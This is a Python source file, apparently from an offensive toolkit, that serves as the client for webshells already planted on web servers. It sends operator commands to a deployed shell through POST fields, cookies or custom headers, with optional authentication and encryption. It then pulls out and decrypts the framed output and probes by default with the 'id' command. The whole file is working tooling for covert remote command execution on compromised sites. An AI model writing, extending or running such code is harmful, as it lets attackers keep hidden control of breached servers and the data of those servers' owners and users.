"""Client for deployed ShellShock webshells.

Builds the request for a webshell's vector/mode, sends a command, and extracts
(and decrypts, when needed) the framed response. Command payloads and
credentials are URL-encoded on the wire (the shell applies urldecode()).
"""

from __future__ import annotations

import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass

from shellsuite import crypto
from shellsuite.protocol import contract, encoding

_DEFAULT_TIMEOUT = 15.0


@dataclass(frozen=True)
class WebShell:
    url: str
    vector: str
    mode: str
    secret: str | None = None
    name: str = "shell"


@dataclass(frozen=True)
class ShellResult:
    success: bool
    output: str = ""
    status: int | None = None
    final_url: str = ""
    error: str | None = None


def validate(shell: WebShell) -> None:
    """Raise ``ValueError`` for an invalid or incomplete shell definition."""
    if shell.vector not in contract.VECTORS:
        raise ValueError(f"unknown vector: {shell.vector!r}")
    if shell.mode not in contract.MODES:
        raise ValueError(f"unknown mode: {shell.mode!r}")
    if shell.mode in ("auth", "encrypted") and not shell.secret:
        raise ValueError(f"{shell.mode} mode requires a secret")


def _build_request(shell: WebShell, command: str) -> urllib.request.Request:
    """Build the transport request for ``command`` on this shell's vector/mode."""
    payload = crypto.encrypt(command, shell.secret) if shell.mode == "encrypted" else command
    value = encoding.encode(payload)
    credential = (
        encoding.encode(shell.secret)
        if shell.mode in ("auth", "encrypted")
        else None
    )

    if shell.vector == "post":
        fields = {contract.PARAM_NAMES["post"]: value}
        if credential is not None:
            fields[contract.AUTH_PARAM_NAMES["post"]] = credential
        data = urllib.parse.urlencode(fields).encode("ascii")
        return urllib.request.Request(
            shell.url,
            data=data,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

    if shell.vector == "cookie":
        cookie = f"{contract.PARAM_NAMES['cookie']}={value}"
        if credential is not None:
            cookie += f"; {contract.AUTH_PARAM_NAMES['cookie']}={credential}"
        return urllib.request.Request(shell.url, headers={"Cookie": cookie}, method="GET")

    headers = {contract.PARAM_NAMES["header"]: value}
    if credential is not None:
        headers[contract.AUTH_PARAM_NAMES["header"]] = credential
    return urllib.request.Request(shell.url, headers=headers, method="GET")


def _extract(body: str) -> str | None:
    """Return the text between the response markers, or None if absent."""
    start = body.find(contract.RESPONSE_BEGIN)
    end = body.find(contract.RESPONSE_END)
    if start == -1 or end == -1 or end < start:
        return None
    return body[start + len(contract.RESPONSE_BEGIN):end]


def run(
    shell: WebShell, command: str, timeout: float = _DEFAULT_TIMEOUT
) -> ShellResult:
    """Send ``command`` to ``shell`` and return its (decrypted) output."""
    validate(shell)
    request = _build_request(shell, command)

    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            status = response.getcode()
            final_url = response.geturl()
            body = response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        try:
            exc.read()
        except OSError:
            pass
        return ShellResult(
            success=False,
            status=exc.code,
            final_url=exc.geturl() or shell.url,
            error=f"HTTP {exc.code}",
        )
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        reason = getattr(exc, "reason", exc)
        return ShellResult(success=False, final_url=shell.url, error=str(reason))

    framed = _extract(body)
    if framed is None:
        return ShellResult(
            success=False,
            status=status,
            final_url=final_url,
            error="no framed output (check vector/mode/secret)",
        )

    if shell.mode == "encrypted":
        try:
            output = crypto.decrypt(framed, shell.secret)
        except ValueError as exc:
            return ShellResult(
                success=False,
                status=status,
                final_url=final_url,
                error=f"could not decrypt response: {exc}",
            )
    else:
        output = framed

    return ShellResult(
        success=True, output=output, status=status, final_url=final_url
    )


def connect(
    shell: WebShell, command: str = "id", timeout: float = _DEFAULT_TIMEOUT
) -> ShellResult:
    """Probe ``shell`` with ``command`` (default ``id``)."""
    return run(shell, command, timeout=timeout)
